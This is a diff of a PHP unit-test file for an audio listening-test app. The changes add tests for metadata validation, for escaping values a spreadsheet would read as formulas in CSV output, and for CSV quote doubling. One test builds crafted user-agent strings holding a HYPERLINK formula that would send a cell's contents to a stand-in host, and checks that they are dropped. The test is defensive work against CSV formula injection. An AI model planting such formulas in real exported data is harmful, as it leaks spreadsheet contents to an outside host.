@@ -147,7 +147,7 @@ final class SaveTest extends TestCase
     public function testSessionMetricsLeaveOutAUserAgentASpreadsheetWouldReadAsAFormula(): void
     {
         // No browser's starts like this, so it is crafted. See
-        // _FORMULA_PREFIXES in listen_and_rate/routers/api/_shared.py.
+        // FORMULA_PREFIXES in listen_and_rate/storage.py.
         foreach (['=', '+', '-', '@', "\t", "\r"] as $prefix) {
             $agent = $prefix . 'HYPERLINK("http://x.example/?"&A1,"click")';
             $this->assertSame([], session_metrics($agent, ['user_agent']), $prefix);
@@ -439,6 +439,16 @@ final class SaveTest extends TestCase
         );
     }
 
+    public function testValidateMetadataRejectsALeadingHyphen(): void
+    {
+        // A spreadsheet would read "-A1" as a formula.
+        $this->expectException(SaveRequestError::class);
+        validate_metadata(
+            [['key' => 'listener', 'type' => 'text', 'required' => true]],
+            ['listener' => '-A1']
+        );
+    }
+
     public function testValidateMetadataRejectsInvalidTextPattern(): void
     {
         $this->expectException(SaveRequestError::class);
@@ -456,6 +466,120 @@ final class SaveTest extends TestCase
             ['listener' => 'v1.2-beta']
         );
         $this->assertSame(['listener' => 'v1.2-beta'], $result);
+    }
+
+    public function testValidateMetadataKeepsAnyCharactersInFreeTextValue(): void
+    {
+        $result = validate_metadata(
+            [['key' => 'comment', 'type' => 'free_text', 'required' => false]],
+            ['comment' => "音が小さい。\nNo issues, thanks!"]
+        );
+        $this->assertSame(['comment' => "音が小さい。\nNo issues, thanks!"], $result);
+    }
+
+    public function testValidateMetadataNormalizesLineBreaksInFreeTextValue(): void
+    {
+        $result = validate_metadata(
+            [['key' => 'comment', 'type' => 'free_text', 'required' => false]],
+            ['comment' => "first\r\nsecond\rthird"]
+        );
+        $this->assertSame(['comment' => "first\nsecond\nthird"], $result);
+    }
+
+    public function testValidateMetadataRemovesControlCharactersFromFreeTextValue(): void
+    {
+        $result = validate_metadata(
+            [['key' => 'comment', 'type' => 'free_text', 'required' => false]],
+            ['comment' => "nul\x00 and bell\x07"]
+        );
+        $this->assertSame(['comment' => 'nul and bell'], $result);
+    }
+
+    public function testValidateMetadataTrimsFreeTextValue(): void
+    {
+        $result = validate_metadata(
+            [['key' => 'comment', 'type' => 'free_text', 'required' => false]],
+            ['comment' => "  padded \n"]
+        );
+        $this->assertSame(['comment' => 'padded'], $result);
+    }
+
+    public function testValidateMetadataTrimsUnicodeSpacesFromFreeTextValue(): void
+    {
+        // The browser's String.trim() removes these too.
+        $result = validate_metadata(
+            [['key' => 'comment', 'type' => 'free_text', 'required' => false]],
+            ['comment' => "\u{3000}\u{00A0}padded\u{FEFF}\u{2028}"]
+        );
+        $this->assertSame(['comment' => 'padded'], $result);
+    }
+
+    public function testValidateMetadataKeepsFreeTextValueReadAsFormula(): void
+    {
+        // Refusing it would refuse an ordinary comment such as "- too quiet";
+        // only the CSV writes it guarded (see formula_guarded_form), since
+        // JSON is not opened as a spreadsheet.
+        $result = validate_metadata(
+            [['key' => 'comment', 'type' => 'free_text', 'required' => false]],
+            ['comment' => '- too quiet']
+        );
+        $this->assertSame(['comment' => '- too quiet'], $result);
+    }
+
+    public function testValidateMetadataRequiresMoreThanWhitespaceInRequiredFreeText(): void
+    {
+        $this->expectException(SaveRequestError::class);
+        validate_metadata(
+            [['key' => 'comment', 'type' => 'free_text', 'required' => true]],
+            ['comment' => " \n\t"]
+        );
+    }
+
+    public function testValidateMetadataRequiresMoreThanAnIdeographicSpaceInRequiredFreeText(): void
+    {
+        // The browser's String.trim() leaves it empty, so the form refuses it too.
+        $this->expectException(SaveRequestError::class);
+        validate_metadata(
+            [['key' => 'comment', 'type' => 'free_text', 'required' => true]],
+            ['comment' => "\u{3000}"]
+        );
+    }
+
+    public function testValidateMetadataAcceptsFreeTextUpToItsMaxLength(): void
+    {
+        // Counted in characters, not bytes.
+        $result = validate_metadata(
+            [['key' => 'comment', 'type' => 'free_text', 'required' => false, 'max_length' => 3]],
+            ['comment' => 'あいう']
+        );
+        $this->assertSame(['comment' => 'あいう'], $result);
+    }
+
+    public function testValidateMetadataRejectsFreeTextLongerThanItsMaxLength(): void
+    {
+        $this->expectException(SaveRequestError::class);
+        validate_metadata(
+            [['key' => 'comment', 'type' => 'free_text', 'required' => false, 'max_length' => 3]],
+            ['comment' => 'あいうえ']
+        );
+    }
+
+    public function testValidateMetadataRejectsTextLongerThanItsMaxLength(): void
+    {
+        $this->expectException(SaveRequestError::class);
+        validate_metadata(
+            [['key' => 'listener', 'type' => 'text', 'required' => false, 'max_length' => 3]],
+            ['listener' => 'abcd']
+        );
+    }
+
+    public function testValidateMetadataRejectsInvalidUtf8InFreeTextValue(): void
+    {
+        $this->expectException(SaveRequestError::class);
+        validate_metadata(
+            [['key' => 'comment', 'type' => 'free_text', 'required' => false]],
+            ['comment' => "bad\xC3\x28"]
+        );
     }
 
     public function testValidateMetadataRejectsSelectValueNotInOptions(): void
@@ -502,6 +626,42 @@ final class SaveTest extends TestCase
             prefix_keys('metadata_', ['device' => 'Headphones', 'system' => 'windows'])
         );
         $this->assertSame([], prefix_keys('survey_', []));
+    }
+
+    // -- formula_guarded_form -----------------------------------------------
+
+    public function testFormulaGuardedFormPrefixesFreeTextValueReadAsFormula(): void
+    {
+        // A spreadsheet would read these as a formula; the prefix keeps them
+        // text without refusing an ordinary comment such as "- too quiet".
+        // Mirrors listen_and_rate/storage.py's _formula_guarded.
+        $this->assertSame(
+            ['formula' => "'=SUM(A1:A2)", 'comment' => "'- too quiet", 'plain' => 'fine'],
+            formula_guarded_form(
+                [
+                    ['key' => 'formula', 'type' => 'free_text'],
+                    ['key' => 'comment', 'type' => 'free_text'],
+                    ['key' => 'plain', 'type' => 'free_text'],
+                ],
+                ['formula' => '=SUM(A1:A2)', 'comment' => '- too quiet', 'plain' => 'fine']
+            )
+        );
+    }
+
+    public function testFormulaGuardedFormLeavesOtherFieldTypesAlone(): void
+    {
+        // A text value may start with '-' (its pattern allows it), and a
+        // select value is one of the configured options; neither is touched.
+        $this->assertSame(
+            ['listener' => '-01', 'mood' => '+1'],
+            formula_guarded_form(
+                [
+                    ['key' => 'listener', 'type' => 'text'],
+                    ['key' => 'mood', 'type' => 'select', 'options' => ['+1', '-1']],
+                ],
+                ['listener' => '-01', 'mood' => '+1']
+            )
+        );
     }
 
     public function testValidateMetadataRejectsNonStringTextValue(): void
@@ -1376,6 +1536,16 @@ final class SaveTest extends TestCase
         $path = $this->tmpDir . '/out.csv';
         write_csv_file($path, ['a', 'b'], [['1', '2']], $this->tmpDir);
         $this->assertSame("a,b\n1,2\n", file_get_contents($path));
+    }
+
+    public function testWriteCsvFileDoublesAQuoteAfterABackslash(): void
+    {
+        // RFC 4180 has no escape character: every quote inside a field is
+        // doubled, as Python's csv module writes it. With '\\' as fputcsv's
+        // escape, a '\\"' in a free_text comment would be left undoubled.
+        $path = $this->tmpDir . '/out.csv';
+        write_csv_file($path, ['a'], [['C:\\"x"']], $this->tmpDir);
+        $this->assertSame("a\n\"C:\\\"\"x\"\"\"\n", file_get_contents($path));
     }
 
     public function testWriteJsonFileRefusesToOverwriteExistingFileWith409(): void
